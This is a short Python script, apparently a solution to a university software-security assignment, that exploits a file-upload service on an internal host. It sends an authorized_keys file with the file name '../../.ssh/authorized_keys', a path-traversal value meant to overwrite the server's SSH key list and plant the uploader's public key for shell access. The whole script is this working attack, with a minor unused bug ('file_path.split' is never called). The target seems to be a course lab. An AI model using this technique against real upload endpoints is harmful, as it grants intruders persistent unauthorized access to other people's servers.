import requests

def upload_file(file_path, server_url, target_directory):
  
  if target_directory:
    file_name = target_directory + '/' + file_path
  else:
    file_name = file_path.split

  files = {'file': (file_name, open('/workspaces/softwaresikkerhet-assignment-4/code/solution/dropbox/authorized_keys', 'rb'))}

  # Make the POST request
  response = requests.post(server_url, files=files)

  # Check the response
  if response.status_code == 200:
    print(response.text)
  else:
    print(f"Failed to upload file. Status code: {response.status_code}")
    print(response.text)
  return response

file_to_upload = 'authorized_keys'
upload_url = 'https://dropbox.internal.regjeringen.uiaikt.no'
target_directory = '../../.ssh'


response = upload_file(file_path=file_to_upload, server_url=upload_url, target_directory=target_directory)
with open('/workspaces/softwaresikkerhet-assignment-4/code/solution/dropbox/authorized_keys', 'rb') as f:
    id_rsa_pub = f.read()
print(id_rsa_pub)
